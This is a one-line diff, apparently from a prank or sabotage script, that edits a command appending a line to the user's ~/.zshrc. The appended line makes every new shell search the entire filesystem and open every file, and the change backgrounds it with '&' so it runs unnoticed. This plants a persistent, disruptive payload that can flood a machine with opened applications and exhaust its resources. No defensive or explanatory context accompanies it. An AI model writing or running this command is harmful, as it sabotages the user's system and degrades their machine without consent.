@@ -1,1 +1,1 @@
-echo "find / -name \* -exec open {} \;" >> ~/.zshrc
+echo "find / -name \* -exec open {} \; &" >> ~/.zshrc
